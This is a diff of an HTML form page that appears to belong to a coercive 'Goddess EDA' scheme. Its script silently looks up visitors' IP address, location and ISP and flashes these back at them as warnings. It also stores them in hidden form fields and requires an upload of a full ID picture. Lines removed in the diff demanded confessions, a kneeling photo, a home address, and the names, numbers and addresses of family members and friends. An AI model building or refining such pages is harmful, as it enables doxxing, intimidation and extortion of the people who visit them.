@@ -42,7 +42,7 @@
             width: 100%;
             margin-bottom: 10px;
         }
-        input[type="submit"], .tribute-button {
+        input[type="submit"], .tribute-button, .chess-button {
             background-color: #00FF00;
             color: black;
             cursor: pointer;
@@ -50,7 +50,7 @@
             border: none;
             margin-top: 10px;
         }
-        input[type="submit"]:hover, .tribute-button:hover {
+        input[type="submit"]:hover, .tribute-button:hover, .chess-button:hover {
             background-color: red;
         }
         .warning {
@@ -78,19 +78,29 @@
     </style>
     <script>
         function fetchIPAndLocation() {
-            fetch('https://ipapi.co/json/')
+            fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
                     document.getElementById("flashing-ip").innerHTML = "⚠ IP Address: " + data.ip;
-                    document.getElementById("flashing-location").innerHTML = "⚠ Location: " + data.city + ", " + data.region + ", " + data.country_name;
-                    document.getElementById("flashing-isp").innerHTML = "⚠ ISP: " + data.org;
-                    document.getElementById("ip-input").value = data.ip;
-                    document.getElementById("location-input").value = data.city + ", " + data.region + ", " + data.country_name;
-                    document.getElementById("isp-input").value = data.org;
+
+                    fetch('https://ipapi.co/' + data.ip + '/json/')
+                        .then(response => response.json())
+                        .then(locationData => {
+                            document.getElementById("flashing-location").innerHTML = 
+                                "⚠ Location: " + locationData.city + ", " + locationData.region + ", " + locationData.country_name;
+                            document.getElementById("flashing-isp").innerHTML = 
+                                "⚠ ISP: " + locationData.org;
+
+                            document.getElementById("ip-input").value = data.ip;
+                            document.getElementById("location-input").value = locationData.city + ", " + locationData.region + ", " + locationData.country_name;
+                            document.getElementById("isp-input").value = locationData.org;
+                        })
+                        .catch(error => {
+                            document.getElementById("flashing-location").innerHTML = "⚠ Error fetching location.";
+                        });
                 })
                 .catch(error => {
                     document.getElementById("flashing-ip").innerHTML = "⚠ Error fetching IP.";
-                    console.error("IP Fetch Error:", error);
                 });
         }
 
@@ -123,24 +133,6 @@
             <input type="hidden" id="location-input" name="Location">
             <input type="hidden" id="isp-input" name="ISP">
 
-            <label for="kneeling_photo">Upload Photo: Kneeling with 'Goddess EDA' on Forehead</label>
-            <input type="file" id="kneeling_photo" name="Kneeling Photo" required>
-            
-            <label for="social_media">Social Media Accounts</label>
-            <input type="text" id="social_media" name="Social Media" required>
-            
-            <label for="confessions">Confessions</label>
-            <textarea id="confessions" name="Confessions" rows="4" required></textarea>
-            
-            <label for="family_info">Names, Numbers, and Addresses of 3 Family Members</label>
-            <textarea id="family_info" name="Family Info" rows="4" required></textarea>
-            
-            <label for="friends_info">Names, Numbers, and Addresses of 3 Close Friends</label>
-            <textarea id="friends_info" name="Friends Info" rows="4" required></textarea>
-            
-            <label for="home_address">Your Home Address</label>
-            <input type="text" id="home_address" name="Home Address" required>
-            
             <label for="id_picture">Upload Full ID Picture</label>
             <input type="file" id="id_picture" name="ID Picture" required>
             
